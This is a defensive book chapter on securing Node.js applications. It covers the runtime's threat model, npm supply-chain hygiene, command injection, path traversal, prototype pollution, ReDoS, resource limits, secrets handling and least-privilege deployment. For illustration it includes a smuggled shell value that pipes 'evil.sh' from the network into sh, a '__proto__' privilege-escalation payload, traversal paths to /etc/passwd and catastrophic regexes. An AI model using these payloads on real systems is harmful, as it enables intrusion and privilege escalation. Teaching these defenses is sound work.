---
chapter: 44
part: "Part VI — Security and Cryptography"
title: "Securing Node.js Applications"
level: advanced
reading_time: "35 min"
prerequisites: [31, 35, 37, 41]
source_docs:
  - "SECURITY.md"
  - "doc/api/permissions.md"
  - "doc/api/cli.md"
  - "doc/api/child_process.md"
  - "doc/api/http.md"
  - "doc/api/zlib.md"
source_url: "https://nodejs.org/docs/latest/api/permissions.html"
node_baseline: "27.0.0-pre"
---

# Chapter 44 — Securing Node.js Applications

## What you will learn

- What the Node.js project considers a vulnerability, what it explicitly does not, and how that boundary shapes your architecture.
- The npm supply chain: lockfiles, `npm audit`'s real value, install scripts, provenance, pinning.
- The injection classes that hit Node specifically — command injection, path traversal, prototype pollution — with working defenses.
- How to spot a catastrophically backtracking regex, and how to bound bodies, decompression, concurrency, and event-loop time.
- How to run with least privilege, and which hardening flags genuinely exist.

## Why this matters

Most Node security incidents are not exotic: a dependency that ran a postinstall script, a `child_process.exec()` with a filename glued into the command string, a JSON body deep-merged into a config object, a container running as root with a writable filesystem. None are bugs in Node. Every one is squarely inside what the project defines as *your* responsibility.

That boundary is the most useful thing here. Node's policy is unusually explicit about what it trusts, and reading it changes how you design. Assume Node sanitises inputs for you, or that the permission model sandboxes untrusted code, and you will build something that fails in a way nobody will call a Node bug.

## Node's threat model

Node's `SECURITY.md` states the model plainly: vulnerabilities requiring the compromise of a trusted element, such as the operating system, are outside its scope.

**Node does not trust:**

| Untrusted input | Notes |
|---|---|
| Data from the remote end of inbound connections accepted through Node APIs and parsed before reaching you | All flavours of HTTP server APIs |
| Data from the remote end of outbound connections — **except payload length** | HTTP client and DNS APIs. Node trusts you to avoid request sizes that cause a DoS |
| Consumers of data protected by Node APIs | e.g. holders of data you encrypted |
| File content and other I/O opened via Node APIs | stdin, stdout, stderr included |

**Node trusts everything else**, and each entry is a decision you now own:

- The developers, infrastructure, and OS that run it.
- **The code it is asked to run** — JavaScript, WASM, and native code, "even if said code is dynamically loaded, e.g., all dependencies installed from the npm registry." That code inherits all privileges of the execution user.
- **Inputs provided by that code**: "it is the responsibility of the application to perform the required input validations, e.g. the input to `JSON.parse()`."
- Any inspector connection, regardless of how it was opened or where the remote end is.
- The filesystem when requiring a module, and the execution path — `path.join()` and `path.normalize()` **trust their input**, and reports about unsanitised paths through them are not vulnerabilities.

### What is explicitly not a vulnerability

The policy lists categories that will never receive a CVE. Several shape how you build:

- **Prototype pollution (CWE-1321).** "Node.js trusts the inputs provided to it by application code... any scenario that requires control over user input is not considered a vulnerability."
- **Malicious third-party modules (CWE-1357).** Code is trusted, so nothing requiring a malicious dependency is a Node vulnerability.
- **Exposing application-level APIs to untrusted users (CWE-653).** The policy names the scenarios: `child_process.exec()` without validation, untrusted control of file paths, and letting users define code that runs with your privileges.
- **Unhandled `'error'` events (CWE-248)** and **exceptions thrown by application callbacks** — a crash from your `SNICallback` throwing is outside the model.
- **Uncontrolled resource consumption on outbound connections**, and **the V8 sandbox** and **`node:vfs`**, neither of which is a Node security boundary.

Even for issues it will not CVE, the project asks that they be reported privately first, because it often improves APIs that make misuse easy.

### The permission model is a seat belt, not a sandbox

`permissions.md` says the model "implements a 'seat belt' approach, which prevents trusted code from unintentionally changing files or using resources that access has not explicitly been granted to. It does not provide security guarantees in the presence of malicious code. Malicious code can bypass the permission model."

It is **Stability 2 - Stable** (since v23.5.0 / v22.13.0) — production-ready, just not the feature people assume. The documented constraints reinforce this:

- It does **not** inherit into worker threads, and **existing file descriptors bypass it entirely.**
- Flags that read files before environment initialisation (`--env-file`, `--openssl-config`) are not subject to it.
- Run-time loadable extensions cannot load, affecting `node:sqlite`; OpenSSL engines cannot be requested at runtime.
- Symlinks are followed even outside granted paths; relative symlinks inside a granted directory may reach arbitrary files.
- `process._debugProcess(pid)` is not gated by any scope, so a restricted process can force another Node process under the same OS user to open its inspector.

**Architectural consequence:** to run untrusted code, the boundary must be at the OS — separate users, containers, seccomp/AppArmor. Use `--permission` to contain your own mistakes.

## The dependency supply chain

Your `node_modules` tree is code you did not write, running with your privileges, which Node trusts completely.

### Lockfiles and reproducible installs

A lockfile pins the exact resolved version and integrity hash of every transitive dependency. Commit it, and use `npm ci` in CI and production images rather than `npm install`: it installs strictly from the lockfile and fails when `package.json` and the lockfile disagree, instead of silently resolving something new. A build that resolves fresh versions is a build you cannot reproduce or audit.

### What `npm audit` is worth

`npm audit` compares your resolved tree against a vulnerability database. Run it, and understand its limits:

- **It finds only *known, reported* vulnerabilities.** A malicious package published an hour ago has no advisory.
- **It does not know whether you reach the vulnerable code.** A "critical" ReDoS in a build tool's CLI path is not critical for you. Triage; do not obey.
- **It cannot always fix.** Transitives pinned by an unmaintained parent produce advisories with no clean remediation, and `npm audit fix --force` will happily introduce breaking majors.

Treat it as one signal. `npm audit signatures` verifies registry signatures on what you installed — a different, complementary check.

### Install scripts are an attack vector

`preinstall`, `install`, and `postinstall` scripts run arbitrary commands as you during `npm install` — before any of your code runs and before any review. This is the mechanism behind most real-world npm compromises: publish a typosquatted or hijacked package, exfiltrate environment variables from `postinstall`.

```bash
npm ci --ignore-scripts
```

Make `--ignore-scripts` the default in CI and Docker builds, or set it in `.npmrc`. A minority of packages genuinely need a build step (native addons); allow those explicitly rather than granting the whole tree the right to execute.

### Provenance and pinning

npm supports **provenance attestations**: a package published from a CI workflow carries a signed statement linking the tarball to the source commit and build. Prefer dependencies that publish with provenance, and publish your own that way. It does not prove the code is safe — it proves the artifact came from the repository it claims.

Beyond that: **pin exactly** (the lockfile pins transitives; use exact versions for direct dependencies of anything security-sensitive), **reduce the tree** (every dependency is a trusted party — a 12-line utility with four transitives is a worse deal than 12 lines of your own code), and **vendor what is critical and small**, converting an ongoing supply-chain risk into a one-time review. An internal registry proxy with a promotion step buys you a window to review new versions before they reach builds.

## Input handling

### Command injection

`child_process.exec()` spawns a shell and executes your string inside it. The docs' warning is blunt: **"Never pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution."**

```mjs
// ❌ `filename` of "x.txt; curl evil.sh | sh" runs both commands.
import { exec } from 'node:child_process';
exec(`convert ${filename} out.png`, callback);
```

```mjs
// ✅ execFile takes an argv array. No shell, no metacharacters.
import { execFile } from 'node:child_process';
execFile('convert', [filename, 'out.png'], callback);
```

The rule: use `execFile()` or `spawn()` with an argument array, and never enable the `shell` option on attacker-influenced input — the docs attach the same warning wherever `shell` can be turned on. If you truly need a shell feature, validate each argument against an allow-list. Quoting is not a defence you can get right across POSIX and Windows shells.

### Path traversal

`path.join()` and `path.normalize()` **trust their input** — the policy says so, and unsanitised-path reports through them are not CVEs. `path.join('/var/data', '../../etc/passwd')` resolves happily outside your directory.

```mjs
// ✅ Resolve, then verify containment.
import { resolve, sep } from 'node:path';

const ROOT = resolve('/var/data/uploads');

export function safePath(userPath) {
  const full = resolve(ROOT, userPath);
  if (full !== ROOT && !full.startsWith(ROOT + sep)) {
    throw new Error('path escapes root');
  }
  return full;
}
```

Two refinements. `startsWith(ROOT)` without the separator would accept `/var/data/uploads-evil`, so `+ sep` matters. And this is a *lexical* check — a symlink inside `ROOT` can still point outside; re-check with `fs.realpath()` and accept the TOCTOU window. Better: store uploads under opaque generated names and keep the user-supplied name as metadata.

### Prototype pollution

Every plain JavaScript object inherits from `Object.prototype`. If an attacker can write to that shared object, every object in the process changes at once. The vector is almost always a recursive merge, or a dynamic property assignment driven by untrusted keys.

```js
// A typical naive deep merge.
function merge(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] ??= {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

Now feed it a request body:

```json
{ "__proto__": { "isAdmin": true } }
```

`JSON.parse()` creates `__proto__` as an ordinary own property, so it survives into the merge. The recursive step assigns through `target['__proto__']`, hitting the setter on `Object.prototype` — and afterwards `({}).isAdmin === true`. Every object in the process, including ones created before the request, now reports `isAdmin`, so `if (user.isAdmin)` passes for everybody. The same trick via `constructor.prototype` reaches the same place, and polluting `toString` or a template key escalates to remote code execution in some template engines.

**Defenses, in order of usefulness:**

1. **Do not deep-merge untrusted input at all.** Validate against a schema and build the result explicitly, field by field. This removes the entire class.
2. **Use null-prototype objects for maps of untrusted keys.** `Object.create(null)` has no prototype, so there is nothing to pollute and no inherited `toString` to shadow.

   ```js
   const counts = Object.create(null);
   counts[userSuppliedKey] = (counts[userSuppliedKey] ?? 0) + 1;
   ```

   A `JSON.parse()` reviver can also strip the dangerous keys:

   ```js
   const safe = JSON.parse(body, (key, value) =>
     key === '__proto__' || key === 'constructor' || key === 'prototype'
       ? undefined
       : value);
   ```

3. **Freeze the prototypes you care about** at startup, after all modules load — `Object.freeze(Object.prototype)`, `Object.freeze(Array.prototype)`. Assignments then fail silently in sloppy mode and throw in strict mode. Some libraries legitimately extend prototypes at load time, so test it.
4. **`structuredClone(value)`** copies by *defining* own properties rather than assigning them, so cloning untrusted input never triggers a prototype setter. Useful for detaching a payload — but it does not strip a literal `__proto__` key, so it is a mitigation, not a sanitizer.
5. **`--disable-proto=delete`** removes `Object.prototype.__proto__`; `--disable-proto=throw` makes access throw `ERR_PROTO_ACCESS`. Closes the `__proto__` route process-wide, but not `constructor.prototype`.
6. **`--frozen-intrinsics`** freezes intrinsics such as `Array` and `Object`. **[Experimental]**, root context only, and the docs warn "code may break under this flag." `--require` and `--import` run before freezing, so polyfills still work.

### ReDoS

A regex that backtracks catastrophically turns a short input into minutes of blocked event loop, and Node has no regex timeout, so one request can take down the process. The signature is **a quantifier applied to a group that itself contains a quantifier or an overlapping alternation**, matched against input that fails late:

```js
/^(a+)+$/           // nested quantifier
/^(\w+\s?)*$/       // quantified group with optional overlap
/^(\d+|\d+\.\d+)$/  // alternatives that match the same prefixes
/^([a-zA-Z]+)*$/    // classic
```

Against `'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'`, the first has exponentially many ways to split the input among repetitions and must try them all before failing.

Defenses, cheapest first: **bound the input length before matching** — a regex safe on 200 characters may be lethal on 100 000. **Rewrite to eliminate ambiguity**: anchor the pattern, make alternatives mutually exclusive, or replace the regex with straight string parsing. **Never build a regex from user input.** **Audit dependencies' patterns too** — most published ReDoS advisories are in validation libraries. And if you truly must run an untrusted pattern, run it in a worker thread you can terminate (Chapter 29); there is no in-process timeout.

## Resource exhaustion

Node's DoS criteria are strict: the policy requires the attack to be asymmetric, deterministic, in a stable public API, and not mitigable by standard operational practice. Almost everything that will take *your* service down fails at least one test and is therefore yours to handle.

### Request body limits

`node:http` does not cap body size, so without a limit a client can stream gigabytes into your process.

```mjs
const MAX_BODY = 1024 * 1024; // 1 MiB

async function readBody(req) {
  let size = 0;
  const chunks = [];
  for await (const chunk of req) {
    size += chunk.length;
    if (size > MAX_BODY) {
      req.destroy();
      throw new Error('payload too large');
    }
    chunks.push(chunk);
  }
  return Buffer.concat(chunks);
}
```

Never trust `Content-Length` — count actual bytes. Pair this with the server timeouts, which exist for slow-drip attacks:

| Setting | Default | Purpose |
|---|---|---|
| `server.requestTimeout` | `300000` (5 min) | Time to receive the entire request. Responds 408 and closes. |
| `server.headersTimeout` | min of `requestTimeout` and `60000` | Time to receive complete headers. Responds 408 and closes. |
| `server.maxRequestsPerSocket` | `0` (no limit) | Requests per keep-alive socket before `Connection: close` and 503. |
| `--max-http-header-size` | 16 KiB | Maximum total header size. |

The docs note that `requestTimeout` and `headersTimeout` "must be set to a non-zero value... to protect against potential Denial-of-Service attacks in case the server is deployed without a reverse proxy in front."

### Decompression bombs

A 10 KB gzip payload can expand to gigabytes. `node:zlib`'s convenience methods accept `maxOutputLength`, but its **default is `buffer.kMaxLength`** — effectively unbounded here. Set it whenever you decompress anything you did not create:

```mjs
import { gunzip } from 'node:zlib';
import { promisify } from 'node:util';

const gunzipAsync = promisify(gunzip);
const plain = await gunzipAsync(body, { maxOutputLength: 8 * 1024 * 1024 });
```

`rejectGarbageAfterEnd: true` (default `false`) additionally fails when trailing input follows the compressed stream, which closes off a smuggling trick where a second gzip member hides behind the first.

### Unbounded concurrency

`await Promise.all(items.map(fetchOne))` with 50 000 items opens 50 000 sockets at once: descriptor exhaustion, memory spikes, and a thundering herd against whatever you are calling. Bound every fan-out with a concurrency limit, and bound the collection you fan out over.

### Event-loop blocking

Node runs your JavaScript on one thread. Any synchronous operation whose cost scales with attacker-controlled input is a denial of service: `JSON.parse()` on a 200 MB body, `zlib.gunzipSync()`, `crypto.scryptSync()`, a sync `fs` call on a network filesystem, a catastrophic regex. Move CPU-bound work to worker threads, use async APIs on request paths, and alert on the event loop delay histogram from `perf_hooks` (Chapter 49).

## Secrets

Never in code, never in the image. A secret in git is a secret in every clone, fork, and CI log forever; rotate it, do not just delete the commit.

| Mechanism | Strength | Weakness |
|---|---|---|
| Environment variables | Universal and simple | Visible in `/proc`, inherited by every child process, dumped by crash and diagnostic tooling |
| Mounted secret files | Not inherited by children; re-readable after rotation; per-file permissions | Requires orchestration support |
| Secrets manager | Central rotation, audit trail, short-lived credentials | Runtime dependency; needs a bootstrap credential |

`process.env` leaks more than people expect. Node's **diagnostic report** includes an `environmentVariables` section by default, so a report triggered by an uncaught exception writes every variable — secrets included — to a file your log shipper may forward. Pass **`--report-exclude-env`** (v23.3.0 / v22.13.0) wherever reports are enabled in production. The same caution applies to core dumps, heap snapshots, and any error reporter that attaches "environment context."

In practice: read secrets once at startup into module-scoped variables, prefer mounted files where your platform supports them, never log `process.env`, and scrub it from anything leaving the box. `--env-file` is convenient in development, but note it reads the file *before* the permission model initialises and so is not subject to it.

For key material, `--secure-heap=n` initialises an OpenSSL secure heap for selected key-generation allocations. The size must be a power of two, cannot be resized at runtime, and the feature is **not available on Windows**.

## Running with least privilege

Node trusts the OS, so the OS is where you draw the real boundary.

- **Never run as root.** `USER node` is one line; root in a container plus an escape is root on the host.
- **Read-only root filesystem**, with a writable `tmpfs` only where genuinely needed.
- **Drop capabilities**: start from `--cap-drop=ALL` and add back only what you need — usually nothing. Bind above port 1024 and let ingress handle 80/443.
- **`no-new-privileges`**, so a setuid binary in the image cannot escalate.
- **Minimal base image.** Distroless or slim removes the shell that command injection would land in.
- **Then add `--permission`** as a second layer against your own bugs.

A realistic starting configuration:

```bash
node --permission \
     --allow-fs-read=/app \
     --allow-fs-read=/etc/ssl \
     --allow-fs-write=/tmp \
     --allow-net \
     server.js
```

Everything else — child processes, workers, native addons, WASI, FFI, the inspector, OpenSSL STORE loaders — stays denied unless you add the matching `--allow-*` flag. The entry point and anything loaded via `-r` are added to the read list automatically, and granting an existing directory implicitly appends a wildcard.

Getting that set right is guesswork, which is what **`--permission-audit`** (v25.8.0) is for: checks run and violations publish to `node:diagnostics_channel` channels (`node:permission-model:fs`, `:net`, `:child`, `:worker`, `:inspector`, `:wasi`, `:addon`, `:ffi`) as `{ permission, resource }` messages, but nothing is denied. Run your test suite under audit mode and turn the collected violations into your allow-list. If both flags are passed, `--permission` wins.

## Hardening flags

Every flag here is documented in `cli.md`. Do not add to this list from memory.

| Flag | Since | What it does |
|---|---|---|
| `--permission` | v20.0.0, Stable since v23.5.0 / v22.13.0 | Enables the permission model; everything denied until allowed |
| `--permission-audit` | v25.8.0 | Checks without denying; publishes violations to diagnostics channels |
| `--disallow-code-generation-from-strings` | v9.8.0 | Makes `eval` and `new Function` throw. Does **not** affect `node:vm` |
| `--disable-proto=delete\|throw` | v13.12.0 / v12.17.0 | Removes `Object.prototype.__proto__`, or throws `ERR_PROTO_ACCESS` |
| `--frozen-intrinsics` | v11.12.0, **1 - Experimental** | Freezes intrinsics like `Array` and `Object`. Root context only; code may break |
| `--no-addons` | v16.10.0 / v14.19.0 | Disables native addons; `process.dlopen` and native `require` throw |
| `--disable-sigusr1` | v23.7.0 / v22.14.0 | Prevents starting a debug session via `SIGUSR1` |
| `--report-exclude-env` | v23.3.0 / v22.13.0 | Omits `environmentVariables` from diagnostic reports |
| `--secure-heap=n` | v15.6.0 | OpenSSL secure heap for key generation. Power of two. Not on Windows |
| `--max-http-header-size=size` | v11.6.0 / v10.15.0 | Caps HTTP header size. Default 16 KiB |

One caution: `--disallow-code-generation-from-strings` is a strong signal that dynamic code is not expected, but the docs are explicit that `node:vm` is unaffected — and `node:vm` is not a security boundary either (Chapter 52).

## Security headers and TLS

Terminate TLS with modern settings (Chapter 37): 1.2 minimum, prefer 1.3, correct chain, HSTS on. Set the headers that shrink browser-side attack surface — `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, a restrictive `Permissions-Policy` — centrally rather than per-route (Chapter 35). A header you set on 40 of 41 routes is a header you do not have.

## Pre-deploy security checklist

Deliberately mechanical. Run it before every release.

**Dependencies**
- [ ] Lockfile committed; CI and production install with `npm ci --ignore-scripts` (exceptions documented).
- [ ] `npm audit` output triaged — not blindly fixed, not blindly ignored.
- [ ] No dependency added this cycle without someone reading what it does.

**Input**
- [ ] No `exec()` or `shell: true` on any attacker-influenced string.
- [ ] Every filesystem path from user input is resolved and containment-checked.
- [ ] No deep merge of untrusted input; request bodies validated against a schema.
- [ ] `Object.freeze(Object.prototype)` at startup, or `--disable-proto` set.
- [ ] Regexes reviewed for nested quantifiers; input length bounded before matching.

**Limits**
- [ ] Body size capped by counting bytes, not by trusting `Content-Length`.
- [ ] `requestTimeout` and `headersTimeout` non-zero.
- [ ] Every decompression call sets `maxOutputLength`.
- [ ] Every fan-out has a concurrency bound; no synchronous CPU-bound work on request paths.

**Secrets**
- [ ] Nothing secret in the repository, image, or build args; nothing logs `process.env`.
- [ ] `--report-exclude-env` set wherever diagnostic reports are enabled.
- [ ] Rotation procedure exists and has been executed at least once.

**Runtime**
- [ ] Non-root user, read-only root filesystem, `--cap-drop=ALL`, `no-new-privileges`.
- [ ] Permission allow-list derived from an actual `--permission-audit` run.
- [ ] Inspector not enabled in production; `--disable-sigusr1` where appropriate.
- [ ] Node version on a supported release line and patched.

## Common mistakes

### ❌ Treating `--permission` as a sandbox for untrusted code

The docs say it does not provide guarantees against malicious code, workers do not inherit it, and open file descriptors bypass it.

```bash
# ❌ Running a user-supplied plugin "safely".
node --permission --allow-fs-read=/app run-user-plugin.js
```

```bash
# ✅ OS-level isolation for untrusted code; --permission as a second layer for your own.
docker run --user 10001 --read-only --cap-drop=ALL --network=none \
  plugin-runner node --permission --allow-fs-read=/app run-user-plugin.js
```

### ❌ Interpolating user input into `exec()`

```mjs
// ❌ Shell metacharacters become commands.
exec(`git clone ${repoUrl} /tmp/work`);
```

```mjs
// ✅ Argument array, no shell.
execFile('git', ['clone', '--', repoUrl, '/tmp/work']);
```

### ❌ `path.join()` as a containment check

`path.join()` trusts its input; it normalises `..` rather than rejecting it.

```mjs
// ❌ "../../etc/passwd" escapes.
const file = path.join(UPLOAD_DIR, req.params.name);
```

```mjs
// ✅ Resolve, then assert containment with a trailing separator.
const full = path.resolve(UPLOAD_DIR, req.params.name);
if (full !== UPLOAD_DIR && !full.startsWith(UPLOAD_DIR + path.sep)) throw new Error('bad path');
```

### ❌ Deep-merging a request body into config or a user object

```mjs
// ❌ `{"__proto__":{"isAdmin":true}}` pollutes every object in the process.
const settings = merge(defaults, JSON.parse(body));
```

```mjs
// ✅ Validate and construct explicitly; nothing untrusted becomes a key.
const input = JSON.parse(body);
const settings = {
  theme: ALLOWED_THEMES.has(input.theme) ? input.theme : defaults.theme,
  pageSize: Math.min(Number(input.pageSize) || defaults.pageSize, 100),
};
```

### ❌ Decompressing user data without a bound

```mjs
// ❌ maxOutputLength defaults to buffer.kMaxLength — effectively unbounded.
const body = await gunzipAsync(req.body);
```

```mjs
// ✅ Bound it, and reject trailing members.
const body = await gunzipAsync(req.body, {
  maxOutputLength: 8 * 1024 * 1024,
  rejectGarbageAfterEnd: true,
});
```

## Production notes

- **Read `SECURITY.md` once a year.** The non-vulnerability list grows as the project clarifies boundaries — recent additions cover the V8 sandbox, `node:vfs`, and callbacks that throw. Each one is a control you now definitely own.
- **Patch the runtime on a schedule, not on panic.** Being three minors behind turns an incident into an upgrade project. Track the release line (Chapter 2) and rehearse the upgrade (Chapter 63).
- **Diagnostics are a data-exfiltration surface.** Reports include environment variables by default, heap snapshots contain live secrets, and inspector connections are fully trusted by Node's model regardless of where the remote end is. Gate them like a database dump.
- **Budget for dependency *response*, not just scanning.** The question during an advisory is "how fast can we ship a patched tree?" If that is days because releases are manual, the scanner is decoration.
- **Log security-relevant events with enough context to investigate** — failed authorization, permission violations, rejected oversized bodies, decompression limits hit. Log the decision and the identity, never the secret.
- **Assume compromise somewhere and limit blast radius**: separate credentials per service, short-lived tokens, network policies. These controls reduce probability; segmentation reduces cost.

## Exercises

1. **Map the boundary.** From `SECURITY.md`'s "What constitutes a vulnerability" and "Examples of non-vulnerabilities", list five behaviours in your application that Node declines to protect. Success: each names the CWE or section and your control for it.
2. **Prove the pollution.** Run the naive `merge()` from this chapter against `{"__proto__":{"polluted":true}}` and show an unrelated object reporting `polluted`. Re-run with `Object.freeze(Object.prototype)` and with `--disable-proto=throw`. Success: you can state what each defense changes and what it does not.
3. **Find the ReDoS.** Measure match time for `/^([a-zA-Z0-9]+\s?)*$/` against 10, 20, 30, and 40 repeated characters followed by a failing character. Success: you can state the input length at which it exceeds 100 ms.
4. **Audit to allow-list.** Run your test suite under `--permission-audit`, subscribe to every `node:permission-model:*` channel, and generate the minimal `--allow-*` set. Success: the suite passes under `--permission` with a flag set strictly smaller than `--allow-fs-read=* --allow-fs-write=*`.
5. **Harden a container end to end.** Non-root user, read-only root filesystem, `--cap-drop=ALL`, `no-new-privileges`, `npm ci --ignore-scripts`, and the flags from exercise 4. Success: the service serves traffic and a shell in the container cannot write outside the mounted `tmpfs`.

## Recap

- Node trusts the OS, the code it runs (including every npm dependency), and the inputs your code hands it. It does not trust data parsed from network peers or file I/O.
- Prototype pollution, command injection, path traversal, malicious dependencies, and unhandled `'error'` events are explicitly **not** Node vulnerabilities.
- The permission model is Stable but is a "seat belt," not a sandbox: workers do not inherit it, open file descriptors bypass it, symlinks are followed outside granted paths, and `process._debugProcess()` is ungated.
- Supply chain: commit the lockfile, install with `npm ci --ignore-scripts`, triage `npm audit` rather than obeying it, prefer provenance, shrink the tree.
- Use `execFile`/`spawn` with argument arrays, never `exec()` with interpolation, and containment-check every resolved path — `path.join()` trusts its input.
- Defeat prototype pollution by not deep-merging untrusted input; then null-prototype objects, frozen prototypes, `--disable-proto`, and (experimentally) `--frozen-intrinsics`.
- Bound everything: body size by counting bytes, `requestTimeout`/`headersTimeout`, `maxOutputLength` on decompression, concurrency on fan-outs, no sync CPU work on request paths.
- Keep secrets out of code and images and set `--report-exclude-env`. Draw the real boundary at the OS — non-root, read-only filesystem, dropped capabilities — and layer `--permission` on top.

## Where to go next

- [Chapter 31 — The Permission Model](../part4-system/31-permission-model.md) for the full flag surface and runtime API.
- [Chapter 37 — TLS and HTTPS](../part5-networking/37-tls-https.md) and [Chapter 35 — HTTP/1.1 Servers](../part5-networking/35-http-servers.md) for transport security and headers.
- [Chapter 41 — Cryptography Essentials](41-crypto-essentials.md) and [Chapter 42 — Encryption, Signatures, Key Management, Certificates](42-crypto-encryption.md) for the primitives.
- [Chapter 28 — Child Processes](../part4-system/28-child-processes.md) for `spawn` versus `exec`.
- [Chapter 50 — Diagnostic Reports, Heap Snapshots, and V8 Tooling](../part7-diagnostics/50-reports-and-heap.md) and [Chapter 60 — Deployment, Containers, and Configuration](../part9-production/60-deployment-and-config.md).
- Official policy: <https://github.com/nodejs/node/blob/main/SECURITY.md> and <https://nodejs.org/docs/latest/api/permissions.html>
